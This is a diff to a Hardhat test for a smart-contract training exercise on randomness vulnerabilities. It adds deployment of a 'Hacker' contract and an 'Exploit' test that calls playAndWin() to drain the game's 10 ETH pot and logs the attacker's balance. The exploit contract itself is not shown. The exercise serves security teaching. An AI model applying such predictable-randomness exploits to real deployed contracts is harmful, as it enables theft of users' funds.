@@ -1,6 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+
 describe('Randomness Vulnerabilites Exercise 1', function () {
 
     let deployer, attacker;
@@ -13,11 +14,11 @@ describe('Randomness Vulnerabilites Exercise 1', function () {
         this.attackerInitialBalance = await ethers.provider.getBalance(attacker.address);
 
         // Deploy wallet and deposit 10 ETH
-        const gameFactory = await ethers.getContractFactory(
-            'contracts/randomness-vulnerabilities-1/Game.sol:Game',
-            deployer
-        );
-        this.game = await gameFactory.deploy({value: GAME_POT});
+        const gameFactory = await ethers.getContractFactory('Game', deployer);
+        this.game = await gameFactory.deploy({ value: GAME_POT });
+
+        const hackerFactory = await ethers.getContractFactory('Hacker', attacker)
+        this.hacker = await hackerFactory.deploy(this.game.address);
 
         let inGame = await ethers.provider.getBalance(this.game.address);
         expect(inGame).to.equal(GAME_POT);
@@ -26,6 +27,9 @@ describe('Randomness Vulnerabilites Exercise 1', function () {
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
 
+        console.log(`Attacker Balance: ${this.attackerInitialBalance}`);
+        await this.hacker.connect(attacker).playAndWin();
+        console.log(`Attacker Balance: ${await ethers.provider.getBalance(attacker.address)}`);
     });
 
     after(async function () {
